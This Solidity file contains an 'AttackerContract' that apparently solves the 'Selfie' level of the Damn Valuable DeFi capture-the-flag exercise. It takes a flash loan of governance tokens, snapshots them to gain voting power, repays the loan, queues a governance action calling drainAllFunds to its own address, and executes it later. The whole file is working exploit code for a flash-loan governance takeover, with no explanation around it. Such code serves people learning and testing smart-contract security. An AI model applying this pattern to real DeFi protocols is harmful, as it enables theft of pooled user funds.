// SPDX-License-Identifier: Unidentified

pragma solidity ^0.8.0;

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot {
    function transfer(address recipient, uint256 amount) external;

    function snapshot() external returns (uint256);
}

contract AttackerContract {
    address pool_address;
    address governance_contract;
    address token_snapshot_contract;
    uint256 actionId;

    constructor(address pool, address governance) {
        pool_address = pool;
        governance_contract = governance;
    }

    function attack(uint256 amount) external {
        ISelfiePool(pool_address).flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        IDamnValuableTokenSnapshot(token).snapshot();
        IDamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = ISimpleGovernance(governance_contract).queueAction(
            pool_address,
            data,
            0
        );
    }

    function finishAttack() external {
        ISimpleGovernance(governance_contract).executeAction(actionId);
    }
}